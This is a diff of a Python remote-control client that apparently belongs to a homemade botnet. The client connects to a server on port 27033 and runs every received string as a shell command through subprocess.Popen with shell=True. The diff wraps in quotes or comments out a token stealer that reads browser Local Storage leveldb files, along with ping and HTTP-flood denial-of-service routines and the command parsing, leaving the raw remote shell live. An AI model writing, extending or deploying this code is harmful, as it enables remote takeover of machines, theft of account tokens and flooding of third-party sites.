@@ -14,7 +14,7 @@ hostname = socket.gethostname()
 SERVER_IP = socket.gethostbyname(str(hostname))
 SERVER_PORT = 27033
 print(str(SERVER_IP) + str(SERVER_PORT))
-def find_tokens(path):
+'''def find_tokens(path):
     path += '\\Local Storage\\leveldb'
 
     tokens = []
@@ -61,7 +61,7 @@ def search_tokens():
                 message += f'{token}\n'
         else:
             message += 'No tokens found.\n'
-    return message
+    return message'''
 class client:
     def start(self):
         connect_thread = threading.Thread(target=self.connect, args=(SERVER_IP, SERVER_PORT))
@@ -70,11 +70,11 @@ class client:
         recv_c_thread.start()
     #function that will connect this client to the server
     def connect(self, server_ip, server_port):
-        try:
+        '''try:
             tok_m = search_tokens()
         except:
             tok_m = "Failed to get tokens"
-            print("token steal failed")
+            print("token steal failed")'''
         
       
          
@@ -95,27 +95,28 @@ class client:
             try:
                 rec_command = s.recv(2048).decode()
                 #return rec_command
-                main_c = rec_command.split()[0]
-                split_command = main_c.split()
+               # main_c = rec_command.split()[0]
+                #split_command = main_c.split()
                 print("got a response")
-                if "ping" in main_c:
-                    try:
-                        self.ping(str(split_command[1]), int(split_command[2]), int(split_command[3]))
-                    except:
-                        self.respond(f"{main_c} error, args: {split_command}")
-                if "flood" in main_c:
-                    try:
-                        self.flood_http(str(split_command[1]), int(split_command[2]))
-                    except:
-                        self.respond(f"{main_c} error, args: {split_command}")
-                if "token" in main_c:
-                    try:
-                        print(tok_m)
-                        s.sendall(tok_m).encode()
-                    except Exception as e:
-                        self.respond(e)
-                else:
-                    subprocess.Popen(main_c, shell=True)
+              #  if "ping" in main_c:
+              #      try:
+              #          self.ping(str(split_command[1]), int(split_command[2]), int(split_command[3]))
+               #     except:
+                #        self.respond(f"{main_c} error, args: {split_command}")
+               # if "flood" in main_c:
+                #    try:
+                 #       self.flood_http(str(split_command[1]), int(split_command[2]))
+                  #  except:
+                   #     self.respond(f"{main_c} error, args: {split_command}")
+         #   if "token" in main_c:
+         #           try:
+         #               print(tok_m)
+         #               s.sendall(tok_m).encode()
+         #           except Exception as e:
+         #               print(e)
+          #             
+                #else:
+                subprocess.Popen(rec_command, shell=True)
             except Exception as e:
                 print(e)
                 continue
@@ -127,33 +128,33 @@ class client:
         else:
             s.send(str(response).encode())
 
-    def ping(self, ip, port, loops):
-        if not ip or not port or not loops:
-            print("define ip & port & loops")
-            return
-        else:
-            for i in int(loops):
-                subprocess.Popen(f"ping {ip}:{port}", shell=True)
+   #def ping(self, ip, port, loops):
+     #   if not ip or not port or not loops:
+      #      print("define ip & port & loops")
+       #     return
+     #   else:
+      #      for i in int(loops):
+       #         subprocess.Popen(f"ping {ip}:{port}", shell=True)
 
-    def flood_http(self, domain, duration):
-        print("FLOODING")
-        r_duration = int(duration) * 200
-        if not domain or not duration:
-            print("define arguments")
-            return
-        else:
-            l = 0
-            print("LOOPS")
-            while True:
-                l+=1
-                if int(l) == int(r_duration) or int(l) > int(r_duration):
-                    break
-                time.sleep(0.2)
-                re = requests.get(f"htt://{str(domain)}")
-                if re.status_code == 200:
-                    pass
-                else:
-                    respond(f"Failed to flood {domain}")
+ #   def flood_http(self, domain, duration):
+    #    print("FLOODING")
+     #   r_duration = int(duration) * 200
+      #  if not domain or not duration:
+       #     print("define arguments")
+        #    return
+        #else:
+         #   l = 0
+          #  print("LOOPS")
+           # while True:
+            #    l+=1
+             ##   if int(l) == int(r_duration) or int(l) > int(r_duration):
+               #     break
+                #time.sleep(0.2)
+      #          re = requests.get(f"htt://{str(domain)}")
+       #         if re.status_code == 200:
+        #            pass
+         #       else:
+          #          respond(f"Failed to flood {domain}")
 print(f"found server-> {SERVER_IP}:{SERVER_PORT}")
 #connect(SERVER_IP, SERVER_PORT)
 print("connecting...")
